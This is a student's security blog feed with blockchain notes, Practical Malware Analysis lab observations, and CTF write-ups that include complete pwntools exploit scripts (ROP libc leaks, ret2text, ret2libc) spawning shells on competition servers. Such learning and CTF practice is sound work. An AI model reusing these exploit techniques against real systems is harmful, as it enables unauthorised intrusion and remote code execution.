<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://yearsnew.github.io</id>
    <title>NewYear&apos;s Blog</title>
    <updated>2022-11-09T16:01:07.278Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://yearsnew.github.io"/>
    <link rel="self" href="https://yearsnew.github.io/atom.xml"/>
    <subtitle>岁岁年年</subtitle>
    <logo>https://yearsnew.github.io/images/avatar.png</logo>
    <icon>https://yearsnew.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, NewYear&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[区块链学习笔记]]></title>
        <id>https://yearsnew.github.io/post/qu-kuai-lian-xue-xi-bi-ji/</id>
        <link href="https://yearsnew.github.io/post/qu-kuai-lian-xue-xi-bi-ji/">
        </link>
        <updated>2022-11-09T14:55:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="区块链基础知识">区块链基础知识</h2>
<h3 id="0x01-比特币的诞生">0x01 比特币的诞生</h3>
<p>起源：2008年 次贷危机 ——&gt; 2008年10月31日 <code>中本聪《比特币：一种点对点的电子现金系统》</code> （标志着第一个区块链应用诞生）<br>
<code>2016年 区块链元年</code><br>
重要事件：2009年1月3日 （赫尔辛基）创世区块 genesis block (block #0，&quot;0号区块&quot;)，首批50个比特币被挖出<br>
       2012年11月28日 比特币交易首次减半（区块#210000）<br>
       2014年1月23日 以太坊白皮书《以太坊：下一代智能合约和区中心化应用平台》<br>
       2015年7月30日 以太坊网络正式诞生<br>
       2016年7月21日 以太坊硬分叉（超过85%算力）：ETH 以太坊，ETC 以太坊经典<br>
       2017年8月1日 比特币硬分叉：BCH 诞生<br>
       2019年1月16日 以太坊君士坦丁堡硬分叉<br>
       2022年9月15日 以太坊 合并</p>
<p>技术支持：<br>
<code>共识机制</code>：1982年 Leslie Lamport 提出拜占庭将军问题 Byzantine Generate Problem<br>
<code>加密技术</code>：1985年 首次讲椭圆曲线用于密码学<br>
        1997年 Adam Back 发明 Hashcash 技术 ——&gt; POW机制<br>
<code>分布式技术</code>：1998年 分布式电子现金系统B-money (引入了POW机制，点对点交易和不可篡改特性，但未采用Hashcash算法)</p>
<p>1.0时代 ：联盟链R3<br>
门罗币Monero：</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[how2heap]]></title>
        <id>https://yearsnew.github.io/post/how2heap/</id>
        <link href="https://yearsnew.github.io/post/how2heap/">
        </link>
        <updated>2022-10-25T16:02:54.000Z</updated>
        <content type="html"><![CDATA[<p><code>开坑之篇</code><br>
有人说，底层的、系统的bug已经有985的学生研究了，让我去学web......》我自认为我很不服气 ）所以，问：how2heap ?👋</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PracticalMalwareAnalysis-Labs]]></title>
        <id>https://yearsnew.github.io/post/e-yi-dai-ma-shi-jian/</id>
        <link href="https://yearsnew.github.io/post/e-yi-dai-ma-shi-jian/">
        </link>
        <updated>2022-09-21T06:37:12.000Z</updated>
        <content type="html"><![CDATA[<p>👻一本好书的开始——</p>
<ul>
<li>实验预备：<br>
0x01 安装 winXP 虚拟机<br>
<a href="https://www.52pojie.cn/thread-661779-1-1.html"><font color=YellowGreen>破解专用虚拟机2.0(致敬大佬)</font></a><br>
0x02 下载实验文件<br>
<a href="https://github.com/mikesiko/PracticalMalwareAnalysis-Labs"><font color=YellowGreen>书目地址环境</font></a><br>
🙇‍原书，及其翻译团队；🙇‍<a href="https://github.com/Vxer-Lee/MalwareAnalysis"><font color=YellowGreen>‍Lee大佬的文章和相关工具</font></a></li>
</ul>
<h2 id="chapter_1l-静态分析技术基础"><strong>Chapter_1L</strong> 静态分析技术基础</h2>
<h3 id="lab01-01"><strong>Lab01-01</strong></h3>
<blockquote>
<ul>
<li>问题：<br>
1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？<br>
2、这些文件是什么时候编译的？<br>
3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？<br>
4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？<br>
5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？<br>
6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？<br>
7、你猜这些文件的目的是什么？</li>
</ul>
</blockquote>
<p><strong>0x001</strong> 上传至  http://www.VirusTotal.com【国外】  或者  https://www.virscan.org/  【国内】<br>
<img src="https://yearsnew.github.io/post-images/1663816253489.png" alt="" loading="lazy"><br>
被大佬们玩多了，一篇红哈哈哈，诚如书后标答所预见😎<br>
<img src="https://yearsnew.github.io/post-images/1663816363240.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> 使用 StudyPE+ x86 查看文件编译时间<br>
<img src="https://yearsnew.github.io/post-images/1663817804845.png" alt="" loading="lazy"></p>
<p><strong>0x003</strong> 使用 Exeinfo PE 查壳（也可继续用StudyPE +86)<br>
结果为 not packed<br>
<img src="https://yearsnew.github.io/post-images/1663820129776.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> 查看导入中引用的动态库，以及API函数</p>
<ol>
<li>The interesting imports from Lab01-01.exe are <em><strong>FindFirstFile</strong></em> , <em><strong>FindNextFile</strong></em>, and <em><strong>CopyFile</strong></em>. These imports tell us that the program searches the file system and copies files.</li>
<li>The most interesting imports from <strong>Lab01-01.dll</strong> are <em><strong>CreateProcess</strong></em> and <em><strong>Sleep</strong></em>.</li>
<li>We also see that this file imports functions from <strong>WS2_32.dll</strong>, which provides network functionality.<br>
<img src="https://yearsnew.github.io/post-images/1663821006956.png" alt="" loading="lazy"><br>
<img src="https://yearsnew.github.io/post-images/1663821816257.png" alt="" loading="lazy"></li>
</ol>
<p><strong>0x005</strong> 用 Strings.exe 查看敏感字符</p>
<ol>
<li>安装Strings</li>
<li>分析exe</li>
</ol>
<pre><code>strings.exe Lab01-01.exe
</code></pre>
<p><img src="https://yearsnew.github.io/post-images/1663825093108.png" alt="" loading="lazy"><br>
联系前面<em>CopyFileA函数</em> ，盲猜这个exe程序，是想把Lab01-01.dll文件拷贝到系统目录，并且伪装成系统文件&quot;kernel32.dll&quot;（假名叫&quot;kerne132.dll&quot;)。<br>
This file can be used as  a host indicator to search for the malware.<br>
3. 分析dll</p>
<pre><code>strings.exe Lab01-01.dll
</code></pre>
<p><img src="https://yearsnew.github.io/post-images/1663826100182.png" alt="" loading="lazy"><br>
发现一个可疑IP地址，联系前面<em>WS2_32.dll动态库</em>，可能是黑客的IP，并通过前述动态库替换加以维持后门。</p>
<h3 id="lab01-02"><strong>Lab01-02</strong></h3>
<blockquote>
<ul>
<li>问题：<br>
1、将文件Lab01-02.exe上传到 http://www.VirusTotal.com/ 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？<br>
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳，如果可能的话。<br>
3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，它们会告诉你什么？<br>
4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</li>
</ul>
</blockquote>
<p><strong>0x001</strong> 上传至  http://www.VirusTotal.com<br>
<img src="https://yearsnew.github.io/post-images/1663826793584.png" alt="" loading="lazy"><br>
依旧一片红😋标答已经难以参考了<br>
One antivirus engine identifies it as a malicious downloader that downloads additional malware; the other two identify it as packed malware.<br>
<img src="https://yearsnew.github.io/post-images/1663826906929.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong>  使用 Exeinfo PE 查壳<br>
<img src="https://yearsnew.github.io/post-images/1663827194332.png" alt="" loading="lazy"><br>
得到upx壳</p>
<p><strong>0x003</strong> 脱壳使用Free UPX 1.7<br>
<img src="https://yearsnew.github.io/post-images/1663832844429.png" alt="" loading="lazy"><br>
发现这个看UPX壳，更详细，脱壳后：<br>
<img src="https://yearsnew.github.io/post-images/1663833108656.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> 使用StudyPE+ x86 查看引用动态库，以及API函数<br>
The most interesting imports are <em><strong>CreateService</strong></em>, <em><strong>InternetOpen</strong></em>, and <em><strong>InternetOpenURL</strong></em><br>
<img src="https://yearsnew.github.io/post-images/1663833820943.png" alt="" loading="lazy"></p>
<p><strong>0x005</strong> 用Strings.exe 分析结果<br>
<img src="https://yearsnew.github.io/post-images/1663834665904.png" alt="" loading="lazy"><br>
根据 MalService ，联想前面创建进程的函数，判断为恶意服务的名字；<br>
后面 http://** 看起来是一个URL，但不知道为什么strings 检测这么奇怪，应该为http://www.malwareanalysisbook.com/</p>
<h3 id="lab01-03"><strong>Lab01-03</strong></h3>
<blockquote>
<ul>
<li>问题：<br>
1、将文件 Lab01-03.exe 上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？<br>
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳，如果可能的话。<br>
3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？<br>
4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？</li>
</ul>
</blockquote>
<p><strong>0x001</strong> 上传至  http://www.VirusTotal.com<br>
这。。。都快红满了！<br>
<img src="https://yearsnew.github.io/post-images/1663835587353.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> 使用 Exeinfo PE 查壳得未知壳，用StudyPE +86差的FSG壳<br>
<img src="https://yearsnew.github.io/post-images/1663842933151.png" alt="" loading="lazy"></p>
<p><strong>0x003</strong> 看标答，好好笑哈哈哈哈<br>
<img src="https://yearsnew.github.io/post-images/1663842053122.png" alt="" loading="lazy"><br>
咱应该暂时解答不出来哈，问题因此也不能回答呢</p>
<p><strong>0x004</strong> 使用 linxerUnpacker 进行脱壳，看到了作者的开发日记（膜拜😼）<br>
<img src="https://yearsnew.github.io/post-images/1663844590027.png" alt="" loading="lazy"><br>
突然发现，这个程序和MFC有点像？？？</p>
<p><strong>0x005</strong> 分析引用动态库，以及API函数<br>
<img src="https://yearsnew.github.io/post-images/1663843569241.png" alt="" loading="lazy"><br>
看到一个有点眼熟的函数，直觉不对，查之前保存的文档：<br>
● OleInitialize<br>
用来初始化COM库。使用COM对象的程序必须在调用任何其他COM功能之前，调用这个函数。<br>
<s>具体威胁挖坑</s><br>
来补坑啦【采用下一章动态调试】<br>
使用apaterDNS 和 kali 自带的<br>
病毒运行结果：<br>
<img src="https://yearsnew.github.io/post-images/1664605272486.png" alt="" loading="lazy"><br>
一些极为不正常的dns:<br>
<img src="https://yearsnew.github.io/post-images/1664606969853.png" alt="" loading="lazy"></p>
<h3 id="lab01-04"><strong>Lab01-04</strong></h3>
<blockquote>
<ul>
<li>问题：<br>
1、将文件 Lab01-04.exe 上传到 http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？<br>
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳，如果可能的话。<br>
3、这个文件是什么时候被编译的？<br>
4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？<br>
5、哪些基于主机或基于网络的迹象，可以被用来确定这个恶意代码感染的机器？<br>
6、这个文件在资源段中包含一个资源。使用 Resource Hacker 工具来检查资源，然后抽取资源。从资源中你能发现什么吗？(Restorator)</li>
</ul>
</blockquote>
<p><strong>0x001</strong> 上传至  http://www.VirusTotal.com<br>
<img src="https://yearsnew.github.io/post-images/1663844708510.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> 分析，明显感觉到比之前的复杂，但不得不说 Strings.exe 真的非常强大！其实单单从</p>
<pre><code>strings.exe Lab01-04.exe
</code></pre>
<p>就可以看出很多东西，比如：</p>
<ol>
<li>!This program cannot be run in DOS mode.</li>
<li>这一系列：<br>
<img src="https://yearsnew.github.io/post-images/1663849191029.png" alt="" loading="lazy"></li>
<li>甚至是需要分离才能在导入引用动态库里看到的：<br>
<img src="https://yearsnew.github.io/post-images/1663849237661.png" alt="" loading="lazy"></li>
<li>更重要的是！：<br>
<img src="https://yearsnew.github.io/post-images/1663849325110.png" alt="" loading="lazy"><br>
The string <em><strong>\system32\wupdmgr.exe</strong></em> indicates that this program could create or modify a file at that location. The string <em>www.malwareanalysisbook.com/updater.exe</em> probably indicates where additional malware is stored, ready for download.<br>
基于以上，我们大胆地展开合理地推测，基本也能看出 malware 的目的。</li>
</ol>
<p><strong>0x003</strong> 查壳无壳，编译时间为假（本书很早，估测有上十年）<br>
<img src="https://yearsnew.github.io/post-images/1663853716806.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> <a href="https://www.freebuf.com/articles/network/265889.html"><font color=YellowGreen>PE文件结构入门到入坟</font></a></p>
<p><strong>0x005</strong> 使用StudyPE+ x86 查看引用动态库，以及API函数<br>
The imports from <em><strong>advapi32.dll</strong></em> indicate that the program is doing something with permissions.<br>
<img src="https://yearsnew.github.io/post-images/1663865996699.png" alt="" loading="lazy"><br>
The imports from kernel32.dll tell us that the program loads data from the resource section (<em><strong>LoadResource</strong></em>, <em><strong>FindResource</strong></em>, and <em><strong>SizeOfResource</strong></em>), writes a file to disk (<em><strong>CreateFile</strong></em> and <em><strong>WriteFile</strong></em>), and executes a file on the disk (<em><strong>WinExec</strong></em>). We can also guess that the program writes files to the system directory because of the calls to <em><strong>GetWindowsDirectory</strong></em>.<br>
<img src="https://yearsnew.github.io/post-images/1663863966715.png" alt="" loading="lazy"></p>
<p><strong>0x006</strong> 用资源管理器（Restorator工具）查看<br>
通过 PE 文件的特征，（PE指纹）前两字节ascii是MZ, 3C位置的十六进制对位位置ascii是 PE。判断BIN中的101文件为PE文件，提取。<br>
<img src="https://yearsnew.github.io/post-images/1663864856887.png" alt="" loading="lazy"></p>
<p><strong>0x007</strong> 提取为 inside.exe 继续用StudyPE+ x86 查看引用动态库，以及API函数<br>
It calls <em><strong>URLDownloadToFile</strong></em>, a function commonly used by malicious downloaders.<br>
<img src="https://yearsnew.github.io/post-images/1663865075242.png" alt="" loading="lazy"><br>
It also calls <em><strong>WinExec</strong></em>, which probably executes the downloaded file.<br>
<img src="https://yearsnew.github.io/post-images/1663865539239.png" alt="" loading="lazy"><br>
The executable in the resource section is a downloader program that downloads additional malware.</p>
<h2 id="chapter_3l-动态分析技术基础"><strong>Chapter_3L</strong> 动态分析技术基础</h2>
<h3 id="lab03-01"><strong>Lab03-01</strong></h3>
<blockquote>
<ul>
<li>问题：<br>
1、找出这个恶意代码的导入函数与字符串列表？<br>
2、这个恶意代码在主机上的感染迹象特征是什么？<br>
3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？</li>
</ul>
</blockquote>
<p>0x01 使用 StudyPE+ x86 查看引用动态库，发现仅仅有一个 ExitProcess 函数，怀疑加壳，用PEiD查壳，果然，再用工具脱壳未果<br>
<img src="https://yearsnew.github.io/post-images/1664558835708.png" alt="" loading="lazy"><br>
0x02 使用 <code>strings.exe </code> 查看文件<br>
<img src="https://yearsnew.github.io/post-images/1664557650521.png" alt="" loading="lazy"><br>
<s>比较可疑的字符串</s><br>
<em><strong>CONNECT %s:%i HTTP/1.0</strong></em> 联网 //这个有可能是程序的printf类的函数的参数，%s可能是域名，%i作用和%d差不多（其实差别很大，但是为了方便理解，这里可以把%i看出%d），应该是端口号<br>
<em><strong>admin</strong></em><br>
<em><strong>advpack</strong></em>   //用来帮助硬件和软件读取和验证.INF文件，INF是硬件设备制造商发布起驱动程序的一种文件格式（说明这个病毒很有可能要去感染某个驱动)<br>
***VideoDriver ***  //显卡驱动（很有可能会感染显卡驱动)<br>
注册表<br>
<em><strong>SOFTWARE\Classes\http\shell\open\commandV</strong></em> 启动命令行<br>
<em><strong>Software\Microsoft\Active Setup\Installed Components</strong></em> 安装组件<br>
<em><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong></em> 自启动！！<br>
<em><strong>SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</strong></em> 共享文件夹<br>
网址<br>
<em><strong>www.practicalmalwareanalysis.com</strong></em></p>
<p>0x03 安装apateDNS 和 I 查看DNS查询<br>
参考 https://blog.csdn.net/m0_46687377/article/details/120733392<br>
<img src="https://yearsnew.github.io/post-images/1664859401522.png" alt="" loading="lazy"><br>
且都使用VMnet2<br>
<img src="https://yearsnew.github.io/post-images/1664859466681.png" alt="" loading="lazy"><br>
kali自带Inetsim工具，所以我们不需要再下载，只需要进入到/etc/inetsim文件夹修改inetsim.conf文件即可<br>
修改inetsim.conf文件的以下内容即可启动DNS服务<br>
service_bind_address： 192.168.40.130（Kali虚拟机IP）<br>
dns_default_ip： 192.168.40.130<br>
redirect_enabled yes<br>
redirect_exclude_port tcp:22<br>
redirect_external_address 192.168.40.130</p>
<p>命令inetsim启动服务</p>
<p>0x04 process monitor 查看运行的进程</p>
<h3 id="lab03-02"><strong>Lab03-02</strong></h3>
<h3 id="lab03-03"><strong>Lab03-03</strong></h3>
<h3 id="lab03-04"><strong>Lab03-04</strong></h3>
<h2 id="chapter_5l-ida-pro"><strong>Chapter_5L</strong> IDA Pro</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[5space2022]]></title>
        <id>https://yearsnew.github.io/post/5space/</id>
        <link href="https://yearsnew.github.io/post/5space/">
        </link>
        <updated>2022-09-21T06:25:09.000Z</updated>
        <content type="html"><![CDATA[<p><s>打破满课一天短暂午休的坐牢</s></p>
<h2 id="pwn">pwn</h2>
<h3 id="5_1h3ll0rop">5_1H3ll0Rop</h3>
<p>整个题目与<br>
exp如下：</p>
<pre><code>from pwn import *
from LibcSearcher import *

p = remote(&quot;39.107.243.76&quot;,51575)
# p=process('./H3ll0Rop',env={'LD_PRELOAD':'./libc-2.23.so'})
# p = process(&quot;./H3ll0Rop&quot;)
elf = ELF(&quot;./H3ll0Rop&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)
context.log_level = &quot;debug&quot;

#利用printf泄露libc
format_str = 0x400778
pop_rdi = 0x400753
pop_rsi_r15 = 0x0400751
printf_plt = elf.plt['printf']
main = elf.sym['main']
printf_got = elf.got['printf']
read_got = elf.got['read']
payload = b'a' * (0x60 + 8) + p64(pop_rdi) + p64(format_str) + p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(printf_plt) + p64(main) 
p.recvuntil(&quot;with me???\n&quot;)
p.sendline(payload)
p.recvuntil('aaaa')
read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(&quot;read_addr:&quot;,hex(read_addr))

#libc 基地址
libc_base = read_addr - libc.sym['read']
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x60 + 8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)  

p.sendline(payload)

p.interactive()
</code></pre>
<h2 id="reverse">Reverse</h2>
<h3 id="5_re2">5_re2</h3>
<p>做题目时，用ida打卡发现不能F5反汇编，经学习，可以使用Ghidra打开。<br>
分析move函数和find函数，找到map地址【0x120012030b】，然后后在ida中 <code>Shift + E</code> 提取数据。<br>
数据为15 * 15 的三层地图，每层从 3 走到 4 。</p>
<h3 id="5_crackme">5_crackme</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NewStarCTF2022]]></title>
        <id>https://yearsnew.github.io/post/2022-newstarctf/</id>
        <link href="https://yearsnew.github.io/post/2022-newstarctf/">
        </link>
        <updated>2022-09-20T04:14:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="pwn">PWN</h2>
<h3 id="ret2text">ret2text</h3>
<p>查看保护和试运行<br>
<img src="https://yearsnew.github.io/post-images/1663647944830.png" alt="" loading="lazy"><br>
shift + F12  查看字符串，含有 /bin/sh，跟进 Ctrl + x 查看调用位置，找到后门函数 backdooOo0r<br>
<img src="https://yearsnew.github.io/post-images/1663648286053.png" alt="" loading="lazy"><br>
简单的ret2text，exp如下：</p>
<pre><code>from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = remote('node4.buuoj.cn',26207)

backdooOo0r = 0x400708

payload = b'a'*(0x20 + 8) + p64(backdooOo0r)
p.recvuntil(&quot;your name?\n&quot;)
p.sendline(payload)

p.interactive()
</code></pre>
<h3 id="calc">calc</h3>
<p>查看保护【保护全开！】和 试运行（感觉是随机数或者整数溢出）<br>
<img src="https://yearsnew.github.io/post-images/1663649389572.png" alt="" loading="lazy"><br>
经过分析，是一道100道随机加减乘除题目，答对了就getshell （=经确认，是我之前一直不会写，现在也不会写的题目😭）</p>
<p>笑死了，看到别的师傅的解，我怀疑是非预期😶‍🌫️😶‍🌫️😶‍🌫️</p>
<pre><code>from pwn import *
#from LibcSearcher import *
local_file = './cala'
local_libc = './libc-2.27.so'
remote_libc = './libc-2.27.so'
#remote_libc = '/home/glibc-all-in-one/libs/buu/libc-2.23.so'
select = 1
if select == 0:
    r = process(local_file)
    libc = ELF(local_libc)
else:
    r = remote('node4.buuoj.cn', 25712)
    libc = ELF(remote_libc)
elf = ELF(local_file)
context.log_level = 'debug'
context.arch = elf.arch
def se(data): return r.send(data)


def sa(delim, data): return r.sendafter(delim, data)
def sl(data): return r.sendline(data)


def sla(delim, data): return r.sendlineafter(delim, data)
def sea(delim, data): return r.sendafter(delim, data)
def rc(numb=4096): return r.recv(numb)
def rl(): return r.recvline()
def ru(delims): return r.recvuntil(delims)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info(tag, addr): return r.info(tag + ': {:#x}'.format(addr))


def debug(cmd=''):
    gdb.attach(r, cmd)


# -----------------------------
for i in range(100):
    ru('What\'s the answer? ')
    sl(str(eval(r.recvuntil('=', drop=True).replace('x', '*'))))
r.interactive()

</code></pre>
<h3 id="ret2libc">ret2libc</h3>
<h3 id="ret2shellcode">ret2shellcode</h3>
<h3 id="fallw1nds-gift">fallw1nd's gift</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[刷题杂记]]></title>
        <id>https://yearsnew.github.io/post/shua-ti-za-ji/</id>
        <link href="https://yearsnew.github.io/post/shua-ti-za-ji/">
        </link>
        <updated>2022-09-20T03:59:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-调整"><strong>[0x00]. 调整</strong></h2>
<p>感觉要学着写规范的WP了，上一篇写了归纳总结，但这期间写的题目都只留了exp和一点画得乱起八糟的堆栈结构分析图，以及exp里微薄的注释。结合大佬的博客，显然有适当的分析图片更容易在翻看时唤起记忆，故此——</p>
<p><s>入门即是堆😍</s></p>
<h2 id="0x01-babyheap_0ctf_2017"><strong>[0x01]. babyheap_0ctf_2017</strong></h2>
<p>【重点是利用思路和调试过程】</p>
<blockquote>
<p>一道 由已 Allocate 分配确定了chunk大小 ，而 Fill 可再输入大小（无穷大，撑爆！）导致的堆溢出漏洞 ==&gt;  Unsorted bin leak + Fastbin Attack + one_gadget</p>
</blockquote>
<ol>
<li>这位师傅写得非常好，分析很细节，而且跟我进度几乎同步 <s>）一点小激动</s><br>
<s>都说堆是瓶颈，当再看这题的时候，师傅还没有再更新😔我也🕊了一段时间</s></li>
<li>题目分析过程就不再重复了：<br>
https://blog.csdn.net/qq_41696518/article/details/126677556?spm=1001.2014.3001.5502</li>
<li>利用思路：<br>
拜师傅对堆利用的总结<br>
https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#0x04-%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[温故而知新]]></title>
        <id>https://yearsnew.github.io/post/wen-gu-er-zhi-xin/</id>
        <link href="https://yearsnew.github.io/post/wen-gu-er-zhi-xin/">
        </link>
        <updated>2022-09-07T13:17:09.000Z</updated>
        <content type="html"><![CDATA[<p>感觉做BUUCTF之类上面的题，就有点像，修仙文中，修炼了一段时间，去历练打小野怪；而参加一些较新的大比赛，就像是打实战（但我很菜）。<br>
本想着看CTFwiki上的栈相关的复习一下，发现又增加了许许多多新的体会，以前了解的并不够透彻。ret2XX系列真的讲得非常清楚！！！<br>
记：周四下午，焦虑的一下午......<br>
渐渐发现，上一篇的很多错误，和理解不到位的地方。暂时挖个坑🕳，之后有时间再修正，同时记得重排【onenote用得还是非常多的，但是杂乱而细碎导致我跳了这么多软件，印象笔记里还有文，没有迁过来应该，语雀非常好！但是没用多少，因为过分追求整齐而劝退使用，现在又跳】感觉适时整理，比一开始就强迫自己好</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[My First Blog]]></title>
        <id>https://yearsnew.github.io/post/my-first-blog/</id>
        <link href="https://yearsnew.github.io/post/my-first-blog/">
        </link>
        <updated>2022-09-05T01:58:30.000Z</updated>
        <content type="html"><![CDATA[<p>本来准备昨天（周天）写一篇一周总结的文字，又突然想到自己搭建博客，恍恍惚惚，一天就过去了😥。<br>
主要较以前更理清了栈溢出的相关内容<br>
以及exp的书写</p>
<h2 id="题目内已经含有后门函数无canary">题目内已经含有后门函数（无canary）</h2>
<pre><code>1.直接覆盖栈，溢出到后门函数的地址
2.shift + f12 列出字符串
3.双击跟进 在段中位置，Ctrl + x 列出调用位置
（另：Ctrl + s 列出所有so文件映射到内存的基地址）
</code></pre>
<blockquote>
<p>相似pwn：<br>
直接后门函数  <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/bjdctf_2020_babystack"><font color=YellowGreen>bjdctf_2020_babystack</font></a><br>
覆盖数字，达到条件   <a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/ciscn_2019_n_8"><font color=YellowGreen>ciscn_2019_n_8</font></a></p>
</blockquote>
<hr>
<h2 id="题目提供了libc">题目提供了libc</h2>
<h3 id="动态链接的ret2libc">动态链接的ret2libc</h3>
<pre><code>使用$ file 【文件名】查看文件的详细信息
# dynamically linked
</code></pre>
<p><font color=CornflowerBlue>用命令查找，体会rop链的构造</font></p>
<ol>
<li><strong>准备工作</strong></li>
</ol>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-8467117"><label class="task-list-item-label" for="task-item-8467117"> 要获得libc的基地址</label></li>
</ul>
<ul>
<li>libc的基地址 = 库函数在程序中加载进内存后的真实地址 - 库函数在libc库中的偏移
<ul>
<li>进一步，“库函数在程序中加载进内存后的真实地址”<br>
动态链接时，库函数的调用过程（以puts函数为🌰）：</li>
<li>而“库函数在libc库中的偏移”则更容易 (以ciscn_2019_c_1为🌰)：<br>
<code> call puts  ==&gt; puts plt ==&gt; puts got ==&gt; puts </code></li>
</ul>
</li>
</ul>
<pre><code>    puts 在 plt 的地址     $ objdump -dj.plt ciscn_2019_c_1
    puts 在 got 的地址    $ objdump -R ciscn_2019_c_1
    ===================================================================
    puts 在 libc 中的偏移 $ objdump -R libc-2.23.so | grep puts
</code></pre>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-8777172"><label class="task-list-item-label" for="task-item-8777172"> 利用execve在libc中的偏移，为达成调用</label></li>
</ul>
<pre><code>    $ one_gadget libc-2.23.so
</code></pre>
<ol start="2">
<li><strong>构造payload</strong></li>
</ol>
<ul>
<li>payload1 = 栈大小 + 8 + pop_rdi + puts_got + puts_plt +main<br>
<code> 32对应4个字节, 64对应8个字节</code><br>
<code> 64位要用pop_rdi 进行栈对齐</code></li>
</ul>
<pre><code>    $ ROPgadget --binary ciscn_2019_c_1 | grep -E 'pop rdi'
</code></pre>
<ul>
<li>payload2 = 栈大小 + 8 + execve_addr</li>
</ul>
<pre><code>    #execve_addr=libc_base + execve_offset
    #libc_base = puts_addr - puts_offet
</code></pre>
<h4 id="font-coloryellowgreenciscn_2019_c_1font"><font color=YellowGreen>ciscn_2019_c_1</font> 🐾</h4>
<p><a href="https://github.com/yearsnew/CTF_Source-WP/tree/main/ciscn_2019_c_1">题目地址 以及 libc-2.23.so地址</a></p>
<p>🤐<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle mathcolor="CadetBlue"><mi>e</mi><mi>x</mi><mi>p</mi><mo>:</mo></mstyle></mrow><annotation encoding="application/x-tex">\color{CadetBlue}exp:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="color:CadetBlue;">e</span><span class="mord mathdefault" style="color:CadetBlue;">x</span><span class="mord mathdefault" style="color:CadetBlue;">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel" style="color:CadetBlue;">:</span></span></span></span></p>
<pre><code>#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote(&quot;node4.buuoj.cn&quot;,26815)
context.log_level = &quot;debug&quot;

#Information about puts
main_addr = 0x400b28
puts_plt = 0x4006e0
puts_got = 0x602020
pop_rdi = 0x400c83
ret_addr = 0x4006b9

#1.get libc_base
payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline('1')
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)
p.recvuntil(&quot;Ciphertext\n&quot;)
p.recvuntil(&quot;\n&quot;)
puts_addr = u64(p.recv(6).ljust(0x8,b&quot;\x00&quot;))
libc = LibcSearcher(&quot;puts&quot;,puts_addr)
libc_base = puts_addr - libc.dump(&quot;puts&quot;)
sys_addr=libc_base + libc.dump('system')
